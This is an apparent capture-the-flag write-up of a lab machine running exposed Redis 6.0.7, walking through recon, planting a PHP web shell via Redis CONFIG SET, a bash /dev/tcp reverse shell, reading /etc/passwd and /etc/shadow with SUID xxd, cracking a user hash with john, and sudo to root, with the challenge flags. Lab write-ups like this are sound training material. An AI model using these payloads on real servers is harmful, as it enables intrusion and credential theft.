#CTF 
_Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!_

## Recon

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
```

I also run gobuster with
```
gobuster dir -u http://10.10.1.109/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 60
```
```
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 11321]
```


## Access

To connect to the redis server is type
`redis-cli -h 10.10.1.109`
and the with `info` I get a lot of information about the machine

I don't know how to exploit a redis server so I searched online.
I found a clever way to exploit it with a reverse shell .
I know that the machine has a 80 port.
So inside the redis server I type
`CONFIG SET dir /var/www/html`
`CONFIG SET dbfilename shell.php`
`set test "<?php system($_GET['cmd']) ?>"`
`save`

And then If I navigate to `10.10.1.109/shell.php` I get this
```
REDIS0009� redis-ver6.0.7� redis-bits�@�ctime��q�d�used-mem�`��aof-preamble���test�� ~%}��w
```

I alter it a bit and go to `view-source:http://10.10.1.109/shell.php?cmd=cat%20/etc/passwd`
and get
```
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash
```

So next I alter my file on the redis server.
I follow the commands as above but on the payload I type
```
set test "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/[local ip]/4444 0>&1'\"); ?>"
```

I open a netcat connection to 4444 and reload the tab and I catch the connection!

I navigate to `home\vianka` and find my flag `thm{red1s_rce_w1thout_credent1als}`

## Priv Esc

I found this one
```
find` `/ -user root -perm -4000 -``exec` `ls` `-ldb {} \; 2>``/dev/null
```

And I notice the xxd, I gtfo bins for sudo
```
LFILE=/etc/shadow 
xxd "$LFILE" | xxd -r
```

And get 

```
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```

I take the hashed password from vianka and I save it in a file
I use john to crack it and I get
`beautiful1`

So now I know the creds to do the switch , but I need a stable shell to do it.
So I spawn on with `python -c 'import pty; pty.spawn("/bin/sh")'`

I sudo -l and get
```
Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

I search again on GTFO bins for env_reset and mail_badpass and find this
```
sudo env /bin/sh
```

And I get root!
The flag is
`thm{xxd_pr1v_escalat1on}`